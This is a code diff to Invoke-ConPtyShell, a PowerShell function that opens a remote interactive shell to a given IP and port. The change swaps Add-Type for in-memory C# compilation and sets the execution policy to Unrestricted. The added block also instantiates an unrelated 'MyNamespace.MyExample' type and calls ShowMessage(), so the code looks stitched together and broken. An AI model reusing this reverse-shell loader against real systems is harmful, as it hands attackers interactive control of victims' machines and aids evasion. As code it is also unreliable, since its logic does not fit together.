@@ -111,7 +111,25 @@ function Invoke-ConPtyShell
     }
     $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
     Set-ExecutionPolicy -Scope CurrentUser Unrestricted
-    Add-Type -TypeDefinition $Source -Language CSharp;
+    
+    # Compile the source code
+    $compilerOptions = New-Object System.CodeDom.Compiler.CompilerParameters
+    $compilerOptions.GenerateExecutable = $false
+    $compilerOptions.GenerateInMemory = $true
+
+    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
+    $compilerResults = $provider.CompileAssemblyFromSource($compilerOptions, $Source)
+
+    # Check for compilation errors
+    if ($compilerResults.Errors.HasErrors) {
+        $compilerResults.Errors | ForEach-Object { Write-Host $_ }
+    } else {
+        # Load and use the compiled assembly
+        $compiledAssembly = $compilerResults.CompiledAssembly
+        $type = $compiledAssembly.GetType("MyNamespace.MyExample")
+        $instance = [Activator]::CreateInstance($type)
+        $instance.ShowMessage()
+    }
     $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
     Write-Output $output
 }
